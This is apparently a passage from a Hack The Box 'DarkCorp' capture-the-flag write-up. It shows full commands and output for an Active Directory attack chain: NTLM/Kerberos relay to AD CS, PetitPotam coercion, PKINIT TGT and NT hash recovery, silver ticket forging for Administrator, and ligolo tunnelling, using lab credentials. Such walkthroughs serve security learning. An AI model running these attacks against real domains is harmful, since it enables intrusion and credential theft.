loaded..</span><br><span class="line">[*] Protocol Client HTTPS loaded..</span><br><span class="line">[*] Protocol Client SMB loaded..</span><br><span class="line">[*] Running <span class="keyword">in</span> relay mode to single host</span><br><span class="line">[*] Setting up HTTP Server on port 80</span><br><span class="line">[*] Setting up WCF Server on port 9389</span><br><span class="line">[*] Setting up RAW Server on port 6666</span><br><span class="line">[*] Multirelay disabled</span><br><span class="line"></span><br><span class="line">[*] Servers started, waiting <span class="keyword">for</span> connections</span><br><span class="line">[*] HTTPD(80): Client requested path: /</span><br><span class="line">[*] HTTPD(80): Client requested path: /</span><br><span class="line">[*] HTTPD(80): Client requested path: /</span><br><span class="line">[*] HTTPD(80): Connection from 127.0.0.1 controlled, attacking target ldap://172.16.20.1</span><br><span class="line">[*] HTTPD(80): Client requested path: /</span><br><span class="line">[*] HTTPD(80): Authenticating against ldap://172.16.20.1 as DARKCORP/SVC_ACC SUCCEED</span><br><span class="line">[*] Assuming relayed user has privileges to escalate a user via ACL attack</span><br><span class="line">[*] Checking <span class="keyword">if</span> domain already has a `dc-011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA` DNS record</span><br><span class="line">[*] Domain does not have a `dc-011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA` record!</span><br><span class="line">[*] Adding `A` record `dc-011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA` pointing to `10.10.16.20` at `DC=dc-011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA,DC=darkcorp.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=darkcorp,DC=htb`</span><br><span class="line">[*] Added `A` record `dc-011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA`. DON<span class="string">&#x27;T FORGET TO CLEANUP (set `dNSTombstoned` to `TRUE`, set `dnsRecord` to a NULL byte)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">â”Œâ”€â”€(kaliã‰¿kali)-[~/Hackthebox/DarkCorp]</span></span><br><span class="line"><span class="string">â””â”€$ curl &#x27;</span>http://172.16.20.2:5000/status<span class="string">&#x27; --json &#x27;</span>&#123;<span class="string">&quot;protocol&quot;</span>:<span class="string">&quot;http&quot;</span>,<span class="string">&quot;host&quot;</span>:<span class="string">&quot;drip.darkcorp.htb&quot;</span>,<span class="string">&quot;port&quot;</span>:<span class="string">&quot;8080&quot;</span>&#125;<span class="string">&#x27; -u &#x27;</span>victor.r:victor1gustavo@<span class="comment">#&#x27; --ntlm</span></span><br><span class="line">&#123;<span class="string">&quot;message&quot;</span>:<span class="string">&quot;http://drip.darkcorp.htb:8080 is down (HTTP 401)&quot;</span>,<span class="string">&quot;status&quot;</span>:<span class="string">&quot;Error!&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>THEN kill ntlmrelay and:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~/Hackthebox/DarkCorp/krbrelayx]</span><br><span class="line">â””â”€$ python3 krbrelayx.py  -t <span class="string">&#x27;https://dc-01.darkcorp.htb/certsrv/certfnsh.asp&#x27;</span> --adcs -v <span class="string">&#x27;WEB-01$&#x27;</span></span><br><span class="line">[*] Protocol Client LDAPS loaded..</span><br><span class="line">[*] Protocol Client LDAP loaded..</span><br><span class="line">[*] Protocol Client HTTPS loaded..</span><br><span class="line">[*] Protocol Client HTTP loaded..</span><br><span class="line">[*] Protocol Client SMB loaded..</span><br><span class="line">[*] Running <span class="keyword">in</span> attack mode to single host</span><br><span class="line">[*] Running <span class="keyword">in</span> kerberos relay mode because no credentials were specified.</span><br><span class="line">[*] Setting up SMB Server</span><br><span class="line">[*] Setting up HTTP Server on port 80</span><br><span class="line">[*] Setting up DNS Server</span><br><span class="line"></span><br><span class="line">[*] Servers started, waiting <span class="keyword">for</span> connections</span><br><span class="line">[*] SMBD: Received connection from 10.129.190.115</span><br><span class="line">[*] HTTP server returned status code 200, treating as a successful login</span><br><span class="line">[*] Generating CSR...</span><br><span class="line">[*] CSR generated!</span><br><span class="line">[*] Getting certificate...</span><br><span class="line">[*] SMBD: Received connection from 10.129.190.115</span><br><span class="line">[*] GOT CERTIFICATE! ID 5</span><br><span class="line">[*] Writing PKCS<span class="comment">#12 certificate to ./WEB-01$.pfx</span></span><br><span class="line">[*] Certificate successfully written to file</span><br><span class="line">[*] HTTP server returned status code 200, treating as a successful login</span><br><span class="line">[*] Skipping user WEB-01$ since attack was already performed</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~/Hackthebox/DarkCorp/PetitPotam]</span><br><span class="line">â””â”€$ python3 PetitPotam.py -u victor.r -p <span class="string">&#x27;victor1gustavo@#&#x27;</span> -d darkcorp.htb <span class="string">&#x27;dc-011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA&#x27;</span> web-01</span><br><span class="line">/home/kali/Hackthebox/DarkCorp/PetitPotam/PetitPotam.py:20: SyntaxWarning: invalid escape sequence <span class="string">&#x27;\ &#x27;</span></span><br><span class="line">  show_banner = <span class="string">&#x27;&#x27;</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                                                                                               </span></span><br><span class="line"><span class="string">              ___            _        _      _        ___            _                     </span></span><br><span class="line"><span class="string">             | _ \   ___    | |_     (_)    | |_     | _ \   ___    | |_    __ _    _ __   </span></span><br><span class="line"><span class="string">             |  _/  / -_)   |  _|    | |    |  _|    |  _/  / _ \   |  _|  / _` |  | &#x27;</span>  \  </span><br><span class="line">            _|_|_   \___|   _\__|   _|_|_   _\__|   _|_|_   \___/   _\__|  \__,_|  |_|_|_| </span><br><span class="line">          _| <span class="string">&quot;&quot;</span><span class="string">&quot; |_|&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span>|_|<span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;|_|&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span>|_|<span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;|_| &quot;</span><span class="string">&quot;&quot;</span> |_|<span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;|_|&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span>|_|<span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;|_|&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span>| </span><br><span class="line">          <span class="string">&quot;`-0-0-&#x27;&quot;</span>`-0-0-<span class="string">&#x27;&quot;`-0-0-&#x27;</span><span class="string">&quot;`-0-0-&#x27;&quot;</span>`-0-0-<span class="string">&#x27;&quot;`-0-0-&#x27;</span><span class="string">&quot;`-0-0-&#x27;&quot;</span>`-0-0-<span class="string">&#x27;&quot;`-0-0-&#x27;</span><span class="string">&quot;`-0-0-&#x27; </span></span><br><span class="line"><span class="string">                                         </span></span><br><span class="line"><span class="string">              PoC to elicit machine account authentication via some MS-EFSRPC functions</span></span><br><span class="line"><span class="string">                                      by topotam (@topotam77)</span></span><br><span class="line"><span class="string">      </span></span><br><span class="line"><span class="string">                     Inspired by @tifkin_ &amp; @elad_shamir previous work on MS-RPRN</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Trying pipe lsarpc</span></span><br><span class="line"><span class="string">[-] Connecting to ncacn_np:web-01[\PIPE\lsarpc]</span></span><br><span class="line"><span class="string">[+] Connected!</span></span><br><span class="line"><span class="string">[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e</span></span><br><span class="line"><span class="string">[+] Successfully bound!</span></span><br><span class="line"><span class="string">[-] Sending EfsRpcOpenFileRaw!</span></span><br><span class="line"><span class="string">[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!</span></span><br><span class="line"><span class="string">[+] OK! Using unpatched function!</span></span><br><span class="line"><span class="string">[-] Sending EfsRpcEncryptFileSrv!</span></span><br><span class="line"><span class="string">[+] Got expected ERROR_BAD_NETPATH exception!!</span></span><br><span class="line"><span class="string">[+] Attack worked!</span></span><br><span class="line"><span class="string">                                                                                                                    </span></span><br><span class="line"><span class="string">â”Œâ”€â”€(kaliã‰¿kali)-[~/Hackthebox/DarkCorp/PetitPotam]</span></span><br><span class="line"><span class="string">â””â”€$ </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure></div>


<p>now get a TGT and eventually the nthash for the machine</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~/Hackthebox/DarkCorp]</span><br><span class="line">â””â”€$ sudo ntpdate 172.16.20.1   </span><br><span class="line">2025-02-14 14:55:32.678602 (+0100) +477.887870 +/- 0.253771 172.16.20.1 s1 no-leap</span><br><span class="line">CLOCK: time stepped by 477.887870</span><br><span class="line">                                                                                                                    </span><br><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~/Hackthebox/DarkCorp]</span><br><span class="line">â””â”€$ python3 ../../PKINITtools/gettgtpkinit.py -cert-pfx <span class="string">&#x27;WEB-01$.pfx&#x27;</span> <span class="string">&#x27;DARKCORP.HTB/WEB-01$&#x27;</span> WEB-01.ccache</span><br><span class="line">2025-02-14 14:55:37,338 minikerberos INFO     Loading certificate and key from file</span><br><span class="line">INFO:minikerberos:Loading certificate and key from file</span><br><span class="line">2025-02-14 14:55:37,719 minikerberos INFO     Requesting TGT</span><br><span class="line">INFO:minikerberos:Requesting TGT</span><br><span class="line">2025-02-14 14:55:45,238 minikerberos INFO     AS-REP encryption key (you might need this later):</span><br><span class="line">INFO:minikerberos:AS-REP encryption key (you might need this later):</span><br><span class="line">2025-02-14 14:55:45,238 minikerberos INFO     71c38057cdb79ce6c9bb327ee48709dede308b0f5a7b152f63a512d84d8581e6</span><br><span class="line">INFO:minikerberos:71c38057cdb79ce6c9bb327ee48709dede308b0f5a7b152f63a512d84d8581e6</span><br><span class="line">2025-02-14 14:55:45,241 minikerberos INFO     Saved TGT to file</span><br><span class="line">INFO:minikerberos:Saved TGT to file</span><br><span class="line">                                                                                                                    </span><br><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~/Hackthebox/DarkCorp]</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>Next we recover the hash:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">                                                                                                                    </span><br><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~/Hackthebox/DarkCorp]</span><br><span class="line">â””â”€$ KRB5CCNAME=WEB-01.ccache python3 ../../PKINITtools/getnthash.py -key 71c38057cdb79ce6c9bb327ee48709dede308b0f5a7b152f63a512d84d8581e6 <span class="string">&#x27;darkcorp.htb/WEB-01$&#x27;</span></span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">[*] Using TGT from cache</span><br><span class="line">[*] Requesting ticket to self with PAC</span><br><span class="line">Recovered NT Hash</span><br><span class="line">8f33c7fc7ff515c1f358e488fbb8b675</span><br><span class="line">                                                                                                                    </span><br><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~/Hackthebox/DarkCorp]</span><br><span class="line">â””â”€$ </span><br></pre></td></tr></table></figure></div>

<p>Now forge a silver ticket using the WEB01$ hash and the domain sid:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~/Hackthebox/DarkCorp]</span><br><span class="line">â””â”€$ nxc ldap dc-01.darkcorp.htb -u <span class="string">&#x27;victor.r&#x27;</span> -p <span class="string">&#x27;victor1gustavo@#&#x27;</span> --get-sid</span><br><span class="line">/usr/lib/python3/dist-packages/bloodhound/ad/utils.py:115: SyntaxWarning: invalid escape sequence <span class="string">&#x27;\-&#x27;</span></span><br><span class="line">  xml_sid_rex = re.compile(<span class="string">&#x27;&lt;UserId&gt;(S-[0-9\-]+)&lt;/UserId&gt;&#x27;</span>)</span><br><span class="line">SMB         172.16.20.1     445    DC-01            [*] Windows Server 2022 Build 20348 x64 (name:DC-01) (domain:darkcorp.htb) (signing:True) (SMBv1:False)</span><br><span class="line">LDAP        172.16.20.1     389    DC-01            [+] darkcorp.htb\victor.r:victor1gustavo@<span class="comment"># </span></span><br><span class="line">LDAP        172.16.20.1     389    DC-01            Domain SID S-1-5-21-3432610366-2163336488-3604236847</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~/Hackthebox/DarkCorp]</span><br><span class="line">â””â”€$ impacket-ticketer -nthash 8f33c7fc7ff515c1f358e488fbb8b675 -domain-sid S-1-5-21-2988385993-1727309239-2541228647 -domain darkcorp.htb -spn cifs/web-01.darkcorp.htb Administrator</span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">[*] Creating basic skeleton ticket and PAC Infos</span><br><span class="line">/usr/share/doc/python3-impacket/examples/ticketer.py:141: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled <span class="keyword">for</span> removal <span class="keyword">in</span> a future version. Use timezone-aware objects to represent datetimes <span class="keyword">in</span> UTC: datetime.datetime.now(datetime.UTC).</span><br><span class="line">  aTime = timegm(datetime.datetime.utcnow().timetuple())</span><br><span class="line">[*] Customizing ticket <span class="keyword">for</span> darkcorp.htb/Administrator</span><br><span class="line">/usr/share/doc/python3-impacket/examples/ticketer.py:600: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled <span class="keyword">for</span> removal <span class="keyword">in</span> a future version. Use timezone-aware objects to represent datetimes <span class="keyword">in</span> UTC: datetime.datetime.now(datetime.UTC).</span><br><span class="line">  ticketDuration = datetime.datetime.utcnow() + datetime.timedelta(hours=int(self.__options.duration))</span><br><span class="line">/usr/share/doc/python3-impacket/examples/ticketer.py:718: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled <span class="keyword">for</span> removal <span class="keyword">in</span> a future version. Use timezone-aware objects to represent datetimes <span class="keyword">in</span> UTC: datetime.datetime.now(datetime.UTC).</span><br><span class="line">  encTicketPart[<span class="string">&#x27;authtime&#x27;</span>] = KerberosTime.to_asn1(datetime.datetime.utcnow())</span><br><span class="line">/usr/share/doc/python3-impacket/examples/ticketer.py:719: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled <span class="keyword">for</span> removal <span class="keyword">in</span> a future version. Use timezone-aware objects to represent datetimes <span class="keyword">in</span> UTC: datetime.datetime.now(datetime.UTC).</span><br><span class="line">  encTicketPart[<span class="string">&#x27;starttime&#x27;</span>] = KerberosTime.to_asn1(datetime.datetime.utcnow())</span><br><span class="line">[*]     PAC_LOGON_INFO</span><br><span class="line">[*]     PAC_CLIENT_INFO_TYPE</span><br><span class="line">[*]     EncTicketPart</span><br><span class="line">/usr/share/doc/python3-impacket/examples/ticketer.py:843: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled <span class="keyword">for</span> removal <span class="keyword">in</span> a future version. Use timezone-aware objects to represent datetimes <span class="keyword">in</span> UTC: datetime.datetime.now(datetime.UTC).</span><br><span class="line">  encRepPart[<span class="string">&#x27;last-req&#x27;</span>][0][<span class="string">&#x27;lr-value&#x27;</span>] = KerberosTime.to_asn1(datetime.datetime.utcnow())</span><br><span class="line">[*]     EncTGSRepPart</span><br><span class="line">[*] Signing/Encrypting final ticket</span><br><span class="line">[*]     PAC_SERVER_CHECKSUM</span><br><span class="line">[*]     PAC_PRIVSVR_CHECKSUM</span><br><span class="line">[*]     EncTicketPart</span><br><span class="line">[*]     EncTGSRepPart</span><br><span class="line">[*] Saving ticket <span class="keyword">in</span> Administrator.ccache</span><br></pre></td></tr></table></figure></div>

<p>We can check our ticket:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~/Hackthebox/DarkCorp]</span><br><span class="line">â””â”€$ klist                                                            </span><br><span class="line">Ticket cache: FILE:Administrator.ccache</span><br><span class="line">Default principal: Administrator@DARKCORP.HTB</span><br><span class="line"></span><br><span class="line">Valid starting       Expires              Service principal</span><br><span class="line">02/14/2025 14:59:52  02/12/2035 14:59:52  cifs/web-01.darkcorp.htb@DARKCORP.HTB</span><br><span class="line">        renew <span class="keyword">until</span> 02/12/2035 14:59:52</span><br></pre></td></tr></table></figure></div>
<p>And now authenticate with the cert:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~/Hackthebox/DarkCorp]</span><br><span class="line">â””â”€$ sudo ntpdate -t 20 172.16.20.1</span><br><span class="line">2025-02-14 20:21:45.390010 (+0100) +479.045611 +/- 0.941473 172.16.20.1 s1 no-leap</span><br><span class="line">CLOCK: time stepped by 479.045611</span><br><span class="line">                                                                                                 </span><br><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~/Hackthebox/DarkCorp]</span><br><span class="line">â””â”€$ certipy-ad auth -pfx <span class="string">&#x27;WEB-01$.pfx&#x27;</span> -u <span class="string">&#x27;WEB-01$&#x27;</span> -domain darkcorp.htb -dc-ip 172.16.20.1 -debug</span><br><span class="line">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Using principal: web-01<span class="variable">$@darkcorp</span>.htb</span><br><span class="line">[*] Trying to get TGT...</span><br><span class="line">[*] Got TGT</span><br><span class="line">[*] Saved credential cache to <span class="string">&#x27;web-01.ccache&#x27;</span></span><br><span class="line">[*] Trying to retrieve NT <span class="built_in">hash</span> <span class="keyword">for</span> <span class="string">&#x27;web-01$&#x27;</span></span><br><span class="line">[*] Got <span class="built_in">hash</span> <span class="keyword">for</span> <span class="string">&#x27;web-01$@darkcorp.htb&#x27;</span>: aad3b435b51404eeaad3b435b51404ee:8f33c7fc7ff515c1f358e488fbb8b675</span><br><span class="line">                      </span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">[Agent : ebelford@drip] Â» interface_create --name darkcorp</span><br><span class="line">INFO[0275] Creating a new <span class="string">&quot;darkcorp&quot;</span> interface...       </span><br><span class="line">error: Tuntap IOCTL TUNSETIFF failed [0], errno device or resource busy</span><br><span class="line">[Agent : ebelford@drip] Â» tunnel_start --tun darkcorp</span><br><span class="line">[Agent : ebelford@drip] Â» INFO[0287] Starting tunnel to ebelford@drip (0a31c47b-6351-4691-ae64-0e78a22ac6ed) </span><br><span class="line">[Agent : ebelford@drip] Â» </span><br><span class="line">[Agent : ebelford@drip] Â» autoroute</span><br><span class="line">? Select routes to add: 172.16.20.3/24</span><br><span class="line">? Create a new interface or use an existing one? Use an existing one</span><br><span class="line">? Select the interface to use darkcorp</span><br><span class="line">INFO[0296] Using interface darkcorp, creating routes... </span><br><span class="line">ERRO[0296] Could not add route 172.16.20.3/24: file exists </span><br><span class="line">? Start the tunnel? Yes</span><br><span class="line">[Agent : ebelford@drip] Â» INFO[0298] Starting tunnel to ebelford@drip (0a31c47b-6351-4691-ae64-0e78a22ac6ed) </span><br><span class="line">ERRO[0298] Unable to create tunnel, err:unable to open tun interface <span class="string">&#x27;darkcorp&#x27;</span> (tun.New device or resource busy), make sure you<span class="string">&#x27;ve created the tun interface and that it&#x27;</span>s not <span class="keyword">in</span> use </span><br><span class="line">[Agent : ebelford@drip] Â» </span><br><span class="line">[Agent : ebelford@drip] Â»  </span><br></pre></td></tr></table></figure></div>

<p>Finally we can get the administrator hash by dumping secrets:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~/Hackthebox/DarkCorp/ligolo]</span><br><span class="line">â””â”€$ nxc ldap dc-01.darkcorp.htb -u <span class="string">&#x27;victor.r&#x27;</span> -p <span class="string">&#x27;victor1gustavo@#&#x27;</span> --get-sid</span><br><span class="line">/usr/lib/python3/dist-packages/bloodhound/ad/utils.py:115: SyntaxWarning: invalid escape sequence <span class="string">&#x27;\-&#x27;</span></span><br><span class="line">  xml_sid_rex = re.compile(<span class="string">&#x27;&lt;UserId&gt;(S-[0-9\-]+)&lt;/UserId&gt;&#x27;</span>)</span><br><span class="line">SMB         172.16.20.1     445    DC-01            [*] Windows Server 2022 Build 20348 x64 (name:DC-01) (domain:darkcorp.htb) (signing:True) (SMBv1:False)</span><br><span class="line">LDAP        172.16.20.1     389    DC-01            [+] darkcorp.htb\victor.r:victor1gustavo@<span class="comment"># </span></span><br><span class="line">LDAP        172.16.20.1     389    DC-01            Domain SID S-1-5-21-3432610366-2163336488-3604236847                                                                                          </span><br><span class="line">                                                                                                 </span><br><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~/Hackthebox/DarkCorp/ligolo]</span><br><span class="line">â””â”€$ ticketer.py -nthash 8f33c7fc7ff515c1f358e488fbb8b675 -domain-sid S-1-5-21-3432610366-2163336488-3604236847 -domain darkcorp.htb -spn cifs/web-01.darkcorp.htb Administrator</span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">[*] Creating basic skeleton ticket and PAC Infos</span><br><span class="line">/usr/local/bin/ticketer.py:120: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled <span class="keyword">for</span> removal <span class="keyword">in</span> a future version. Use timezone-aware objects to represent datetimes <span class="keyword">in</span> UTC: datetime.datetime.now(datetime.UTC).</span><br><span class="line">  aTime = timegm(datetime.datetime.utcnow().timetuple())</span><br><span class="line">[*] Customizing ticket <span class="keyword">for</span> darkcorp.htb/Administrator</span><br><span class="line">/usr/local/bin/ticketer.py:403: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled <span class="keyword">for</span> removal <span class="keyword">in</span> a future version. Use timezone-aware objects to represent datetimes <span class="keyword">in</span> UTC: datetime.datetime.now(datetime.UTC).</span><br><span class="line">  encTicketPart[<span class="string">&#x27;authtime&#x27;</span>] = KerberosTime.to_asn1(datetime.datetime.utcnow())</span><br><span class="line">/usr/local/bin/ticketer.py:404: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled <span class="keyword">for</span> removal <span class="keyword">in</span> a future version. Use timezone-aware objects to represent datetimes <span class="keyword">in</span> UTC: datetime.datetime.now(datetime.UTC).</span><br><span class="line">  encTicketPart[<span class="string">&#x27;starttime&#x27;</span>] = KerberosTime.to_asn1(datetime.datetime.utcnow())</span><br><span class="line">/usr/local/bin/ticketer.py:406: 